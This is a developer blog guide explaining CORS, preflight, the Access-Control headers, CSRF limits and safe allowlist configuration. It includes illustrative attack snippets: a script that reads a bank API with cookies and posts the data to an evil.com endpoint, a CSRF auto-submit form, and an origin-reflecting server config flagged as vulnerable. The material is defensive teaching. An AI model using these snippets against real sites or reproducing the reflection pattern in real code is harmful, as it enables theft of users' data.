---
title: "CORS and API Security: What Developers Get Wrong"
description: "CORS is one of the most misunderstood browser security mechanisms. Learn what it actually protects against, what it doesn't, how preflight works, why wildcards are dangerous, and how to configure it correctly without opening security holes."
pubDate: 2026-06-03
author: "Khashayar Parhami"
tags: ["api-security", "security", "guide"]
image: "/images/og/cors-and-api-security.png"
featured: false
---

CORS generates more confused Stack Overflow questions than almost any other web security topic. Developers encounter a CORS error, find a snippet that makes it go away, paste it in, and move on — often without understanding what protection they just disabled or what problem they were actually solving.

The confusion is understandable. CORS involves the browser, the server, and the concept of "origin" — and most explanations focus on fixing the error rather than explaining the mechanism. This guide explains what CORS actually is, what it protects, what it doesn't, and how to configure it correctly.

---

## What CORS Is Protecting Against

CORS is not a server-to-server security mechanism. It's a **browser-enforced policy** that controls which origins can read responses from a different origin.

To understand why it exists, consider what browsers allow by default:

```html
<!-- A page on evil.com can make requests to your bank's API -->
<script>
fetch('https://api.mybank.com/account/balance', {
  credentials: 'include' // sends the user's bank cookies
})
.then(r => r.json())
.then(data => {
  // Send data to attacker's server
  fetch('https://evil.com/steal', { method: 'POST', body: JSON.stringify(data) });
});
</script>
```

Without any restriction, a malicious page could make authenticated requests to any API, read the responses, and exfiltrate them. This is a cross-origin data theft attack.

CORS prevents this by requiring the **server to explicitly permit** cross-origin reads. The browser will not expose the response body to JavaScript unless the server signals approval via `Access-Control-Allow-Origin`.

The critical framing: **CORS controls what JavaScript can read, not what the browser can send.** The request still arrives at your server. The browser suppresses the response on the JavaScript side.

---

## The Same-Origin Policy

CORS is an extension of the **Same-Origin Policy (SOP)**, the foundational browser security rule:

> Scripts on one origin cannot read resources from a different origin.

**Origin** is defined as the combination of scheme + host + port:

| URL | Origin |
|---|---|
| `https://app.example.com/page` | `https://app.example.com` |
| `https://app.example.com:8080/page` | `https://app.example.com:8080` |
| `http://app.example.com/page` | `http://app.example.com` |
| `https://api.example.com/page` | `https://api.example.com` |

The last two are **different origins** despite sharing the `example.com` domain. Subdomain, port, and scheme all matter.

SOP blocks JavaScript from reading cross-origin responses. CORS provides a controlled way to relax that restriction for specific trusted origins.

---

## Simple Requests vs Preflight

Not all cross-origin requests behave the same way. The browser splits them into two categories.

### Simple requests

A request is "simple" if it meets all of these conditions:
- Method is `GET`, `HEAD`, or `POST`
- Headers are only the browser-set defaults plus `Content-Type` (with specific values: `application/x-www-form-urlencoded`, `multipart/form-data`, or `text/plain`)
- No custom headers

Simple requests are sent directly. The browser includes an `Origin` header, the server responds, and then the browser decides whether to expose the response to JavaScript based on the `Access-Control-Allow-Origin` header.

```
Browser → Server: GET /api/data
                  Origin: https://app.example.com

Server  → Browser: 200 OK
                   Access-Control-Allow-Origin: https://app.example.com

Browser: ✓ Origin matches — expose response to JavaScript
```

```
Browser → Server: GET /api/data
                  Origin: https://evil.com

Server  → Browser: 200 OK
                   Access-Control-Allow-Origin: https://app.example.com

Browser: ✗ Origin doesn't match — block JavaScript from reading response
          (the request was made and the server responded — CORS only blocks the read)
```

### Preflight requests

Any request that doesn't meet the "simple" criteria triggers a **preflight**: an automatic `OPTIONS` request sent before the actual request, asking the server whether the real request is permitted.

This covers:
- Methods other than GET/POST/HEAD (`PUT`, `DELETE`, `PATCH`)
- Custom headers (`Authorization`, `Content-Type: application/json`, `X-Request-ID`)
- Requests with credentials

```
Browser → Server: OPTIONS /api/orders
                  Origin: https://app.example.com
                  Access-Control-Request-Method: DELETE
                  Access-Control-Request-Headers: Authorization, Content-Type

Server  → Browser: 204 No Content
                   Access-Control-Allow-Origin: https://app.example.com
                   Access-Control-Allow-Methods: GET, POST, DELETE
                   Access-Control-Allow-Headers: Authorization, Content-Type
                   Access-Control-Max-Age: 86400

Browser: ✓ Preflight approved — send actual DELETE request
```

If the preflight fails (the server doesn't return the right headers, or returns an error), the browser blocks the actual request entirely.

`Access-Control-Max-Age` tells the browser how long to cache the preflight result in seconds. Setting this to a reasonable value (e.g. `86400` for 24 hours) avoids a preflight on every single request.

---

## The Access-Control Headers

### Access-Control-Allow-Origin

The most important header. Controls which origins can read the response.

```http
Access-Control-Allow-Origin: https://app.example.com   // specific origin
Access-Control-Allow-Origin: *                          // any origin (dangerous)
```

**Wildcard (`*`) considerations:**
- Cannot be combined with `Access-Control-Allow-Credentials: true` — the browser rejects this combination
- Allows any origin on the internet to read the response
- Appropriate for truly public APIs (open data, public documentation endpoints)
- Never appropriate for APIs that return user data or accept authentication

### Access-Control-Allow-Methods

Which HTTP methods are permitted in cross-origin requests:

```http
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
```

### Access-Control-Allow-Headers

Which request headers are permitted:

```http
Access-Control-Allow-Headers: Authorization, Content-Type, X-Request-ID
```

### Access-Control-Allow-Credentials

Whether the browser should include cookies, HTTP authentication, or TLS client certificates with cross-origin requests:

```http
Access-Control-Allow-Credentials: true
```

This requires `Access-Control-Allow-Origin` to be a specific origin — not `*`. The browser enforces this strictly.

### Access-Control-Expose-Headers

By default, JavaScript can only access a small set of response headers (called "CORS-safelisted response headers"). To expose custom headers to JavaScript:

```http
Access-Control-Expose-Headers: X-Request-ID, X-RateLimit-Remaining
```

### Access-Control-Max-Age

How long (in seconds) to cache the preflight response:

```http
Access-Control-Max-Age: 86400
```

---

## What CORS Does NOT Protect Against

This is where most of the confusion lives.

### CORS does not prevent CSRF

The most dangerous misconception. CORS controls what JavaScript can **read**. It does not prevent a cross-site form submission or a simple GET request from reaching your server.

```html
<!-- On evil.com — this works regardless of your CORS policy -->
<form action="https://app.example.com/account/delete" method="POST">
  <input type="hidden" name="confirm" value="true" />
</form>
<script>document.forms[0].submit();</script>
```

This POST request will reach your server with the user's cookies. Your CORS headers will block evil.com's JavaScript from reading the response, but the account deletion still happens.

**CSRF protection requires `SameSite` cookies or CSRF tokens.** CORS is not CSRF protection. See [Secure Cookie Design](/blog/secure-cookie-design) for how `SameSite` attributes address this.

### CORS does not protect server-to-server requests

CORS is enforced by the browser. Server-to-server requests don't go through a browser. An attacker making direct HTTP requests to your API from a script, `curl`, Postman, or their own server will never be blocked by CORS.

### CORS does not protect against direct browser navigation

If a user navigates directly to `https://api.example.com/data`, their browser loads it as a top-level navigation — no CORS check.

### Summary

| Threat | CORS protection |
|---|---|
| JS on evil.com reading your API response | ✓ Prevented |
| Cross-site form POST (CSRF) | ✗ Not prevented |
| Server-to-server requests | ✗ Not applicable |
| Direct browser navigation | ✗ Not applicable |
| Non-browser HTTP clients | ✗ Not applicable |

---

## Dangerous CORS Configurations

### Wildcard with credentials

```javascript
// This is rejected by browsers — but some servers try it
res.setHeader('Access-Control-Allow-Origin', '*');
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

Browsers reject `*` with credentials. Some developers work around this by dynamically reflecting the `Origin` header — which is worse:

```javascript
// DO NOT DO THIS
const origin = req.headers.origin;
res.setHeader('Access-Control-Allow-Origin', origin); // reflects any origin
res.setHeader('Access-Control-Allow-Credentials', 'true');
```

This effectively disables CORS: any origin in the world can make credentialed requests and read responses. This is a critical vulnerability.

### Overly broad origin matching

```javascript
// Dangerous — matches evil-example.com, notexample.com, etc.
if (req.headers.origin.endsWith('example.com')) {
  res.setHeader('Access-Control-Allow-Origin', req.headers.origin);
}

// Also dangerous — regex with no anchoring
if (/example\.com/.test(req.headers.origin)) { ... }
```

Always use an explicit allowlist:

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://admin.example.com',
]);

function corsMiddleware(req, res, next) {
  const origin = req.headers.origin;
  if (origin && ALLOWED_ORIGINS.has(origin)) {
    res.setHeader('Access-Control-Allow-Origin', origin);
    res.setHeader('Vary', 'Origin'); // tell caches this varies by origin
  }
  if (req.method === 'OPTIONS') {
    res.setHeader('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE');
    res.setHeader('Access-Control-Allow-Headers', 'Authorization, Content-Type');
    res.setHeader('Access-Control-Max-Age', '86400');
    return res.status(204).end();
  }
  next();
}
```

Note the `Vary: Origin` header — this is required when you dynamically set `Access-Control-Allow-Origin`. Without it, a cache might serve a response with the wrong origin header.

---

## Correct Configuration by Use Case

### Public read-only API (no auth, no user data)

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: GET, HEAD
Access-Control-Max-Age: 86400
```

### Authenticated API with specific frontend origins

```javascript
const ALLOWED_ORIGINS = new Set([
  'https://app.example.com',
  'https://www.example.com',
]);

// In dev, optionally add localhost
if (process.env.NODE_ENV !== 'production') {
  ALLOWED_ORIGINS.add('http://localhost:3000');
}
```

```http
// Response headers for allowed origins:
Access-Control-Allow-Origin: https://app.example.com
Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS
Access-Control-Allow-Headers: Authorization, Content-Type
Access-Control-Allow-Credentials: true
Access-Control-Max-Age: 86400
Vary: Origin
```

### Internal API (no browser clients)

No CORS headers needed. If a browser somehow reaches your internal API, the absence of CORS headers will block cross-origin JavaScript reads — which is the safe default.

---

## Testing Your CORS Configuration

```bash
# Test a simple cross-origin request
curl -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: GET" \
     -v https://api.example.com/data 2>&1 | grep -i "access-control"

# Test a preflight
curl -X OPTIONS \
     -H "Origin: https://evil.com" \
     -H "Access-Control-Request-Method: DELETE" \
     -H "Access-Control-Request-Headers: Authorization" \
     -v https://api.example.com/data 2>&1 | grep -i "access-control"
```

If `evil.com` is not in your allowlist, neither response should include `Access-Control-Allow-Origin`. If it does, your configuration has a problem.

---

## Further Reading

- [Secure Cookie Design](/blog/secure-cookie-design) — `SameSite` for actual CSRF protection
- [API Security Checklist](/blog/api-security-checklist) — CORS in the broader API security context
- [Session vs Token Authentication](/blog/session-vs-token-authentication) — how credentials in cross-origin requests fit into auth design
